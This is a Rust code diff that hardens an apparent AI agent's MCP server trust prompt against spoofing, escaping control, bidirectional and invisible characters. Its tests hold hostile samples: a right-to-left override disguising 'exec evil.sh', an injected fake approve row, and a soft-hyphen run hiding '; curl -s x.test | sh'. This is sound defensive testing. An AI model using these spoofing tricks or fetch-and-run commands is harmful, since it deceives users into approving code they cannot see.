@@ -1192,7 +1192,7 @@ impl McpRuntime {
         }
         self.say(Event::Raw(format!(
             "Project MCP server '{}' is defined in .mcp.json.\n  {}\n  [1] approve  [2] approve all  [3] reject  [esc] dismiss remaining prompts\n",
-            super::terminal_safe(&name),
+            prompt_value(&super::terminal_safe(&name)),
             what_it_runs(&config)
         )));
         self.say(Event::TrustPrompt { name, digest });
@@ -1611,10 +1611,10 @@ impl Drop for McpRuntime {
 }
 
 /// The trust prompt's rows that say what approving lets run or reach, as the
-/// entry has it (`${VAR}` and all: a pending entry is not expanded), through
-/// [`super::terminal_safe`]: a stdio server's command line and the names of
-/// the variables it sets, or a remote server's address and the headers it
-/// sends with where each value comes from. Names, never values: a value can
+/// entry has it (`${VAR}` and all: a pending entry is not expanded), each
+/// spelled by [`prompt_value`] and never cut short: a stdio server's command
+/// line and the names of the variables it sets, or a remote server's address
+/// and the headers it sends with where each value comes from. Names, never values: a value can
 /// be a credential written into the file, and these rows stay in the
 /// transcript. A changed environment or credential source is a changed entry
 /// ([`config::entry_digest`]), and these rows are how its prompt differs from
@@ -1655,15 +1655,35 @@ fn what_it_runs(config: &ServerConfig) -> String {
         rows.push(format!("headers: {}", headers.join(", ")));
     }
     rows.iter()
-        .map(|row| super::terminal_safe(row))
+        .map(|row| prompt_value(row))
         .collect::<Vec<_>>()
         .join("\n  ")
 }
 
+/// One value of the trust prompt as the approval view spells a command it
+/// asks about ([`crate::tui::approval_view::command_text`]): nothing a
+/// terminal would obey, and nothing it would hide or reorder -- a
+/// bidirectional override, a zero-width or invisible code point -- left as it
+/// is, so the prompt cannot show a command other than the one that runs. One
+/// row: a line break is `\x0a` here, where the approval view keeps it as a
+/// row break, so a value cannot draw rows of its own under the prompt's.
+#[cfg(unix)]
+fn prompt_value(text: &str) -> String {
+    crate::tui::approval_view::command_text(&text.replace('\n', "\\x0a"))
+}
+
+/// Where there is no TUI to borrow the approval view from, upstream's tokens
+/// alone ([`crate::tools::question::terminal_safe`]), which spell the line
+/// break too.
+#[cfg(not(unix))]
+fn prompt_value(text: &str) -> String {
+    crate::tools::question::terminal_safe(text).into_owned()
+}
+
 /// One word of a command line as a POSIX shell would read it back: bare when
 /// nothing in it needs quoting, else single-quoted, else -- when it holds a
-/// control character, which [`super::terminal_safe`] would drop and so hide
-/// -- ANSI-C quoted with the character spelled out.
+/// control character -- ANSI-C quoted with the character spelled out, so the
+/// shown word means what the shell would be given.
 fn shell_word(word: &str) -> String {
     let bare = |byte: u8| byte.is_ascii_alphanumeric() || b"/._-+=:,@%".contains(&byte);
     if !word.is_empty() && word.bytes().all(bare) {
@@ -1719,14 +1739,73 @@ mod tests {
         );
         config.env.clear();
         config.transport = Kind::Http;
-        config.url = "https://example.test/mcp?x=\u{7}1".into();
-        assert_eq!(what_it_runs(&config), "url: https://example.test/mcp?x=1");
+        config.url = "https://example.test/mcp?x=\u{7}1\n  [1] approve".into();
+        // A control character is spelled out, not dropped, and a line break
+        // draws no row of its own.
+        assert_eq!(
+            what_it_runs(&config),
+            r"url: https://example.test/mcp?x=\x071\x0a  [1] approve"
+        );
+        config.url = "https://example.test/mcp".into();
         config.headers = vec![("X-A".into(), "static-secret".into())];
         config.header_env = vec![("X-Team".into(), "TEAM".into())];
         config.bearer_token_env = Some("TOKEN".into());
         assert_eq!(
             what_it_runs(&config),
-            "url: https://example.test/mcp?x=1\n  headers: X-A, X-Team from $TEAM, Authorization from $TOKEN"
+            "url: https://example.test/mcp\n  headers: X-A, X-Team from $TEAM, Authorization from $TOKEN"
         );
+    }
+
+    #[test]
+    fn a_character_that_reorders_or_hides_text_is_named_in_every_prompt_row() {
+        // U+202E (right-to-left override) would draw `exec evil.sh ; safe`
+        // backwards; U+2066 (left-to-right isolate) and U+200B (zero width
+        // space) change what is drawn without being seen. The approval view's
+        // spelling names each by its number.
+        let mut config = ServerConfig::local(
+            "p",
+            "/bin/sh",
+            &[
+                "-c".into(),
+                "safe \u{202e}hs.live cexe".into(),
+                "\u{2066}x\u{200b}".into(),
+            ],
+        );
+        config.env = vec![("K".into(), "v".into())];
+        let shown = what_it_runs(&config);
+        assert_eq!(
+            shown,
+            r"command: /bin/sh -c 'safe \u{202e}hs.live cexe' '\u{2066}x\u{200b}'
+  env: K"
+        );
+        assert!(
+            !shown.contains(['\u{202e}', '\u{2066}', '\u{200b}']),
+            "{shown:?}"
+        );
+        config.transport = Kind::Http;
+        config.url = "https://a.test/\u{202e}lmth.xedni".into();
+        assert_eq!(
+            what_it_runs(&config),
+            r"url: https://a.test/\u{202e}lmth.xedni
+  env: K"
+        );
+    }
+
+    #[test]
+    #[ignore = "passes once SEC-A4 adds the Default_Ignorable code points (U+00AD and the rest) to approval_view::names_code_point; at de6618de/cea26eb3 the table names U+200B-200F, U+2028-202E, U+2060-206F, U+FEFF, U+061C and C1 only"]
+    fn a_soft_hyphen_run_cannot_hide_the_tail_of_a_command() {
+        // SEC-A4 measured that a run of U+00AD hides what follows in tmux and
+        // herdr: the prompt would show `/bin/true` while `; curl …` runs.
+        let config = ServerConfig::local(
+            "p",
+            "/bin/sh",
+            &[
+                "-c".into(),
+                "/bin/true\u{ad}\u{ad}\u{ad}; curl -s x.test | sh".into(),
+            ],
+        );
+        let shown = what_it_runs(&config);
+        assert!(!shown.contains('\u{ad}'), "{shown:?}");
+        assert!(shown.contains(r"\u{00ad}"), "{shown:?}");
     }
 }
